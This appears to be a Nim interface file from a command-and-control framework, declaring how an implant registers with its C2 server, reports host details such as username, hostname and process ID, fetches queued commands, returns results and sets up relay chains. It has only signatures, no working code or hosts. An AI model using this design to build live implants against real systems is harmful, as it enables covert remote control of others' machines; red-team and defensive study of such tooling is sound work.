#[
    Port OUT: CommunicationRepositoryPort
    Interface for C2 server communication (provided by infrastructure)
]#

import ../../models/[command, implant]
import asyncdispatch

type
    CommunicationRepositoryPort* = concept
        ## Port for C2 server communication operations
        proc registerWithC2*(self, implant: Implant, localIP: string, username: string, 
                           hostname: string, osInfo: string, pid: int, 
                           processName: string, isRelay: bool, role: string): Future[bool]
        proc reconnectToC2*(self, implant: Implant): Future[bool]
        proc getQueuedCommand*(self, implant: Implant): Future[tuple[guid: string, command: string, args: seq[string]]]
        proc postCommandResults*(self, implant: Implant, guid: string, result: string): Future[bool]
        proc postRelayRegisterRequest*(self, implant: Implant, clientId: string, 
                                      localIP: string, username: string, hostname: string,
                                      osInfo: string, pid: int, processName: string,
                                      isRelay: bool, role: string): Future[bool]
        proc postChainInfo*(self, implant: Implant, agentId: string, chainInfo: string, 
                           role: string, connections: int): Future[bool]

